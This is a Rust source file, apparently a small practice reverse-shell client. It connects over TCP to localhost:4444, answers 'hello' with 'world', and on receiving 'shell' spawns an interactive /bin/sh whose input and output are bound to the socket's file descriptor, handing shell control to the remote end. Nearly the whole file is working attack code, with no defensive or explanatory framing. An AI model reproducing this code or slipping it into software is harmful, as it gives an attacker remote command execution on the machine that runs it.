#![allow(unused_imports)]
use tokio::net::TcpStream;
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use std::str;
use std::process::{Stdio};
use tokio::process::Command;
use std::os::unix::io::{AsRawFd, FromRawFd};
use tokio::sync::mpsc;

#[tokio::main]
async fn main(){
    
    let mut s = TcpStream::connect("localhost:4444").await.unwrap();
    loop{
        
        let mut buff = vec![0;128];
        let n = s.read(&mut buff).await;
        let fd = &s;
        match n{
            Ok(0) => return,
            Ok(_n) => {
                        let data = str::from_utf8(&buff[..n.unwrap()]).unwrap();
                        match data{
                            "hello\n" => {
                                s.write(b"world\n").await.unwrap();
                            }
                            "shell\n" => {
                                
                                Command::new("/bin/sh")
                                .arg("-i")
                                .stdin(unsafe { Stdio::from_raw_fd(fd.as_raw_fd()) })
                                .stdout(unsafe { Stdio::from_raw_fd(fd.as_raw_fd()) })
                                .stderr(unsafe { Stdio::from_raw_fd(fd.as_raw_fd()) })
                                .spawn()
                                .unwrap()
                                .wait()
                                .await
                                .unwrap();
                            }
                                
                            
                            _ => print!("{}", data)
                        }
                    }
                
            Err(_) => return,
            }
            
        }
}
